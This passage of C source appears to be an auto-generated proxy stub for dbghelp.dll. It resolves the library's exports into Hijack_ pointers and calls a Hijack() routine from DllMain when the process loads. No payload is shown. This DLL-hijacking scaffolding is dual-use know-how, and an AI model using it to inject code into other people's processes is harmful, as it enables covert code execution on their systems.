			Hijack_SymSrvDeltaNameW = GetAddress("SymSrvDeltaNameW");
			Hijack_SymSrvGetFileIndexInfo = GetAddress("SymSrvGetFileIndexInfo");
			Hijack_SymSrvGetFileIndexInfoW = GetAddress("SymSrvGetFileIndexInfoW");
			Hijack_SymSrvGetFileIndexString = GetAddress("SymSrvGetFileIndexString");
			Hijack_SymSrvGetFileIndexStringW = GetAddress("SymSrvGetFileIndexStringW");
			Hijack_SymSrvGetFileIndexes = GetAddress("SymSrvGetFileIndexes");
			Hijack_SymSrvGetFileIndexesW = GetAddress("SymSrvGetFileIndexesW");
			Hijack_SymSrvGetSupplement = GetAddress("SymSrvGetSupplement");
			Hijack_SymSrvGetSupplementW = GetAddress("SymSrvGetSupplementW");
			Hijack_SymSrvIsStore = GetAddress("SymSrvIsStore");
			Hijack_SymSrvIsStoreW = GetAddress("SymSrvIsStoreW");
			Hijack_SymSrvStoreFile = GetAddress("SymSrvStoreFile");
			Hijack_SymSrvStoreFileW = GetAddress("SymSrvStoreFileW");
			Hijack_SymSrvStoreSupplement = GetAddress("SymSrvStoreSupplement");
			Hijack_SymSrvStoreSupplementW = GetAddress("SymSrvStoreSupplementW");
			Hijack_SymUnDName = GetAddress("SymUnDName");
			Hijack_SymUnDName64 = GetAddress("SymUnDName64");
			Hijack_SymUnloadModule = GetAddress("SymUnloadModule");
			Hijack_SymUnloadModule64 = GetAddress("SymUnloadModule64");
			Hijack_UnDecorateSymbolName = GetAddress("UnDecorateSymbolName");
			Hijack_UnDecorateSymbolNameW = GetAddress("UnDecorateSymbolNameW");
			Hijack_WinDbgExtensionDllInit = GetAddress("WinDbgExtensionDllInit");
			Hijack__EFN_DumpImage = GetAddress("_EFN_DumpImage");
			Hijack_block = GetAddress("block");
			Hijack_chksym = GetAddress("chksym");
			Hijack_dbghelp = GetAddress("dbghelp");
			Hijack_dh = GetAddress("dh");
			Hijack_fptr = GetAddress("fptr");
			Hijack_homedir = GetAddress("homedir");
			Hijack_inlinedbg = GetAddress("inlinedbg");
			Hijack_itoldyouso = GetAddress("itoldyouso");
			Hijack_lmi = GetAddress("lmi");
			Hijack_lminfo = GetAddress("lminfo");
			Hijack_omap = GetAddress("omap");
			Hijack_optdbgdump = GetAddress("optdbgdump");
			Hijack_optdbgdumpaddr = GetAddress("optdbgdumpaddr");
			Hijack_srcfiles = GetAddress("srcfiles");
			Hijack_stack_force_ebp = GetAddress("stack_force_ebp");
			Hijack_stackdbg = GetAddress("stackdbg");
			Hijack_sym = GetAddress("sym");
			Hijack_symsrv = GetAddress("symsrv");
			Hijack_vc7fpo = GetAddress("vc7fpo");
			
            Hijack();


        }

    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


